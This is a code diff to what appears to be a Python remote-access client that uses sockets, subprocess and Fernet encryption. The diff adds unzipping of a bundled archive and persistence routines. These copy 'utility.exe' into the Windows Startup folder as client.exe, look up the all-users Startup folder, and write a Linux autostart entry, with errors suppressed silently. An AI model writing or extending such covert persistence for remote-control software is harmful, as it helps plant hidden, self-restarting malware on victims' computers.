@@ -6,6 +6,7 @@ import socket
 import subprocess
 import stat
 import time
+from utility import unzip
 from cryptography.fernet import Fernet
 
 
@@ -29,6 +30,9 @@ class client:
 
     def __init__(self):
         self.setup()
+
+        if os.path.exists('./content.zip'):
+            unzip()
 
         self.connect()
 
@@ -78,13 +82,23 @@ class client:
     def copy_windows_simple(self):
         try:
             user = os.getlogin()
-            start_up_dir = path = os.path.join('C:', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            start_up_script =  os.path.join(start_up_dir, 'client')
+            start_up_dir = 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % user
+            # start_up_dir = self.startupdirectory()
+            start_up_script =  os.path.join(start_up_dir, 'client.exe')
             if not os.path.exists(start_up_script):
-                shutil.copyfile('./client', start_up_script)
+                shutil.copyfile('./utility.exe', start_up_script)
         except Exception as error:
             # print(str(error), file=sys.stderr)
             sys.exit(1)
+
+    def startupdirectory(self):
+        from win32com.shell import shell, shellcon
+        return shell.SHGetFolderPath(
+            0,
+            shellcon.CSIDL_COMMON_STARTUP,
+            0,# null access token (no impersonation)
+            0 # want current value, shellcon.SHGFP_TYPE_CURRENT isn't available, this seems to work
+        )
 
 
     def copy_windows_registry(self):
@@ -181,7 +195,7 @@ class client:
         auto_config_dir = os.path.join(config_dir, "autostart")
         auto_config_file = os.path.join(auto_config_dir, "client")
         auto_config_desktop = os.path.join(auto_config_dir, "client.desktop")
-        script_path = './utility'
+        script_path = './client'
         try:
             if not os.path.exists(config_dir):
                 os.mkdir(config_dir)
